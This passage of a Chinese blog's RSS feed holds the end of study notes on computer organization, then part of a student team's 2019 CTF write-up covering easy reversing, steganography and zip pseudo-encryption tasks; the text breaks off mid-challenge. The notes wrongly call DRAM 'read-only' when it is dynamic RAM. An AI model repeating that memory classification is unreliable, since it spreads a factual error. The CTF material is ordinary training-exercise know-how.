        <guid>https://dorinxl.github.io/p/%E7%AC%AC%E4%BA%94%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90/</guid>
        <description>&lt;p&gt;&lt;strong&gt;计算机的三个子系统&lt;/strong&gt;：中央处理单元（CPU）、主存储器和输入/输出子系统。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;中央处理单元&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CPU有三个组成部分：算术逻辑单元、控制单元、寄存器组。&lt;/li&gt;
&lt;li&gt;算术逻辑单元控制三种操作：逻辑运算、移位运算、算术运算。&lt;/li&gt;
&lt;li&gt;寄存器有三部分：数据寄存器、指令寄存器、程序寄存器。&lt;/li&gt;
&lt;li&gt;控制单元控制各个子系统的操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;主存储器&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主存储器是存储单元的集合，每个存储单元有位移标识，称为地址。内存地址用无符号二进制整数定义。
&lt;ul&gt;
&lt;li&gt;存储器的类型：&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;RAM（随机存取存储器），断电后信息丢失。
RAM分为静态(SRAM)和只读(DRAM)。
SRAM用传统触发器门电路，速度快，但价格昂贵；
DRAM使用电容器，速度慢但价格便宜。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ROM(只读存储器)，断电后信息不会消失。
PROM(可编程只读存储器)可用来存储特定程序。
EPROM(可擦除可编程只读存储器)可用紫外光擦写。
EEPROM(电可擦除可编程只读存储器)用电子脉冲来编程和擦写。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;输入/输出子系统&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;非存储设备：键盘、监视器、输出设备等。&lt;/li&gt;
&lt;li&gt;存储设备：磁介质存储设备、光存储设备&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;子系统的互联&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CPU和存储器之间的连接：有三组线路连接在一起，分别是数据总线、地址总线和控制总线。&lt;/li&gt;
&lt;li&gt;I/O设备的连接：输入输出设备通过一种被称为输入/输出控制器或接口的器件连接到总线上。几种控制器：
&lt;ul&gt;
&lt;li&gt;小型计算机系统接口(SCSI)&lt;/li&gt;
&lt;li&gt;火线&lt;/li&gt;
&lt;li&gt;通用串行总线(USB)&lt;/li&gt;
&lt;li&gt;高清晰度多媒体接口(HDMI)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;输入输出设备的寻址是数据在CPU和输入输出设备中传送的过程，有两种寻址方法，分别是：I/O独立寻址和I/O存储器映射寻址。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;程序执行&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;CPU利用重复的机器周期来执行程序中的指令，一个周期包括三部分：取指令、译码和执行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;输入输出设备的运行比CPU要慢得多，有三种方法被设计用于控制同步，分别是：程序控制输入/输出、中断控制输入/输出、直接存储器存取。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;不同的体系结构&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CISC—复杂指令计算机&lt;/li&gt;
&lt;li&gt;RISC—精简指令计算机&lt;/li&gt;
&lt;li&gt;并行处理
&lt;ol&gt;
&lt;li&gt;SISD(单指令流，单数据流)&lt;/li&gt;
&lt;li&gt;SIMD(单指令流，多数据流)&lt;/li&gt;
&lt;li&gt;MISD(多指令流，单数据流)&lt;/li&gt;
&lt;li&gt;MIMD(多指令流，多数据流)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>第一届“信安杯”部分WriteUp</title>
        <link>https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/</link>
        <pubDate>Mon, 25 Nov 2019 05:09:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/</guid>
        <description>&lt;h2 id=&#34;第一届信安杯部分writeup------oooooohleegay队&#34;&gt;第一届“信安杯”部分WriteUp&amp;mdash;&amp;mdash;OooooohLeeGay队！
&lt;/h2&gt;&lt;h1 id=&#34;小队成员按姓氏郭泽坤李江川赵乐祺&#34;&gt;&lt;em&gt;小队成员（按姓氏）：郭泽坤、李江川、赵乐祺&lt;/em&gt;
&lt;/h1&gt;&lt;h1 id=&#34;以下这部分是做出来的&#34;&gt;&lt;em&gt;以下这部分是做出来的&lt;/em&gt;
&lt;/h1&gt;&lt;h2 id=&#34;20191123-24&#34;&gt;&lt;em&gt;2019.11.23-24&lt;/em&gt;
&lt;/h2&gt;&lt;h3 id=&#34;re1&#34;&gt;++Re1：++
&lt;/h3&gt;&lt;p&gt;&lt;em&gt;解题：李江川，郭泽坤&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;打开题目链接，压缩包解压后有一个.exe,打开后是一个让你点灯的游戏，所有灯点亮后就会得到flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1319.png&#34;
	width=&#34;554&#34;
	height=&#34;294&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1319_hu4436707833989051019.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1319_hu1714827653014527491.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;188&#34;
		data-flex-basis=&#34;452px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;直接一路输入1~8，发现全部灯被点亮，得到flag。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1322.png&#34;
	width=&#34;554&#34;
	height=&#34;294&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1322_hu16605959607906537432.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1322_hu13682512788199498935.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;188&#34;
		data-flex-basis=&#34;452px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;re2&#34;&gt;++Re2：++
&lt;/h3&gt;&lt;p&gt;&lt;em&gt;解题：赵乐祺&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;下载下来之后是开源文件，c语言，读一下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1221.png&#34;
	width=&#34;1187&#34;
	height=&#34;802&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1221_hu10411636787484274029.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1221_hu13876137574171439451.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;148&#34;
		data-flex-basis=&#34;355px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;可以知道，first是十六进制的0xcafe，second是一个数，这个数不能满足(second % 5 == 3 || second % 17 != 8)，那么最小的这个数17+8=25满足；同时strlen是指字符串长度，也就是7，我们把这些数值算出来再用十六进制表示即可得到一个长得很奇怪的flag；&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1224.png&#34;
	width=&#34;788&#34;
	height=&#34;197&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1224_hu15672113792533557923.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1224_hu15363354447747050193.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;400&#34;
		data-flex-basis=&#34;960px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;我还是要吐槽一遍长的是真的奇怪，应该是我见过的太少了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1226.png&#34;
	width=&#34;71&#34;
	height=&#34;33&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1226_hu7138774904859247055.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1226_hu9357933824905328974.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;215&#34;
		data-flex-basis=&#34;516px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;re3&#34;&gt;++Re3++：
&lt;/h3&gt;&lt;p&gt;&lt;em&gt;解题：赵乐祺&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;打开后发现了py的字样，是提示，这是一份py文件，用python反编译之后是个迷宫（maze）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1229.png&#34;
	width=&#34;985&#34;
	height=&#34;447&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1229_hu8306910292810941245.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1229_hu17624981765545004519.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;220&#34;
		data-flex-basis=&#34;528px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;把迷宫从一维变为二维：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1239.png&#34;
	width=&#34;535&#34;
	height=&#34;293&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1239_hu52404205802628319.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1239_hu17875749497542472627.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;182&#34;
		data-flex-basis=&#34;438px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;按照代码给出的位置移动的输入方法，输入了一堆字符串。flag里就是我们input的这些字符串。&lt;/p&gt;
&lt;h3 id=&#34;re5&#34;&gt;++Re5：++
&lt;/h3&gt;&lt;p&gt;&lt;em&gt;解题：赵乐祺&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;冰菓大法好！咳咳。&lt;/p&gt;
&lt;p&gt;打开这个exe让我们输入flag，随便瞎点两下，找到了提示，让我们把这个exe扔进dnspy看看：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1211.png&#34;
	width=&#34;1920&#34;
	height=&#34;1020&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1211_hu15158806507566795628.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1211_hu12957877554366514910.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;188&#34;
		data-flex-basis=&#34;451px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;一页一页的点下来后发现了这么一大串看起来像是ascii的东西，直觉告诉我们这就是flag了（其实英文好可以看出来encryptstr是一个复合单词，加密字符串）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1214.png&#34;
	width=&#34;649&#34;
	height=&#34;843&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1214_hu5059747998432313418.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1214_hu15146987801660382859.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;76&#34;
		data-flex-basis=&#34;184px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;自己写个解密的c：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1216.png&#34;
	width=&#34;1049&#34;
	height=&#34;296&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1216_hu11236159993264797185.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1216_hu5687631393245388757.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;354&#34;
		data-flex-basis=&#34;850px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;运行得出结果：&lt;/p&gt;
&lt;h2 id=&#34;image1218png&#34;&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1218.png&#34;
	width=&#34;231&#34;
	height=&#34;35&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1218_hu15082029481739753471.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1218_hu13313398571056387543.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;660&#34;
		data-flex-basis=&#34;1584px&#34;
	
&gt;
&lt;/h2&gt;&lt;h3 id=&#34;misc1漫漫长路签到题&#34;&gt;++Misc1漫漫长路签到题：++
&lt;/h3&gt;&lt;p&gt;&lt;em&gt;解题：赵乐祺、李江川&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;打开后说有两张图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1269.png&#34;
	width=&#34;1920&#34;
	height=&#34;1098&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1269_hu6040191525031042935.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1269_hu5642002236106573035.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;174&#34;
		data-flex-basis=&#34;419px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;看了一下内存大小，挺大的，在010editor中找到了【50 4B 01 02】等zip的头文件字样，大胆的把后缀改为zip，amazing！：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1272.png&#34;
	width=&#34;976&#34;
	height=&#34;221&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1272_hu1028850529330879417.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1272_hu2845521505906355325.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;441&#34;
		data-flex-basis=&#34;1059px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;打开之后就是社工大法好：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1275.png&#34;
	width=&#34;745&#34;
	height=&#34;516&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1275_hu7366241146442873974.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1275_hu17975888602090017888.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;144&#34;
		data-flex-basis=&#34;346px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;然后由不愿意透露姓名的官方提供：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1277.png&#34;
	width=&#34;227&#34;
	height=&#34;28&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1277_hu17342317280524410085.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1277_hu3037105530322302290.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;810&#34;
		data-flex-basis=&#34;1945px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;misc2-很简单的hex&#34;&gt;++Misc2 很简单的Hex：++
&lt;/h3&gt;&lt;p&gt;&lt;em&gt;解题：李江川&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;开幕暴击:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1249.png&#34;
	width=&#34;745&#34;
	height=&#34;516&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1249_hu8077308785581166890.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1249_hu8247574535381571913.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;144&#34;
		data-flex-basis=&#34;346px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;打开题目链接，下载压缩包，是一张图片，可能是有隐写，但是用stegsolve并没有发现在图层之间有隐藏信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1336.png&#34;
	width=&#34;554&#34;
	height=&#34;297&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1336_hu17015114600716376471.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1336_hu16995356026567903315.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;186&#34;
		data-flex-basis=&#34;447px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1338.png&#34;
	width=&#34;554&#34;
	height=&#34;297&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1338_hu16152058090339834861.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1338_hu17629793368873311053.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;186&#34;
		data-flex-basis=&#34;447px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;那就考虑查看文件格式，发现flag：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1340.png&#34;
	width=&#34;554&#34;
	height=&#34;311&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1340_hu9581362872250331922.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1340_hu4347501934605867520.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;178&#34;
		data-flex-basis=&#34;427px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;misc3不想让你打开&#34;&gt;++Misc3不想让你打开：++
&lt;/h3&gt;&lt;p&gt;&lt;em&gt;解题：赵乐祺&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;zip伪加密：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1254.png&#34;
	width=&#34;491&#34;
	height=&#34;546&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1254_hu2468218353525175969.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1254_hu4455213130397795380.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;89&#34;
		data-flex-basis=&#34;215px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;把伪加密改回00 00，解压之后有这些东西：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1256.png&#34;
	width=&#34;771&#34;
	height=&#34;134&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1256_hu10420736113759982982.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1256_hu7736389317768844078.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;575&#34;
		data-flex-basis=&#34;1380px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;下意识的把zip扔进010：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1258.png&#34;
	width=&#34;503&#34;
	height=&#34;587&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1258_hu11105023363462860553.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1258_hu17072647357543542758.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;85&#34;
		data-flex-basis=&#34;205px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;改了之后发现并没有什么卵用：&lt;/p&gt;
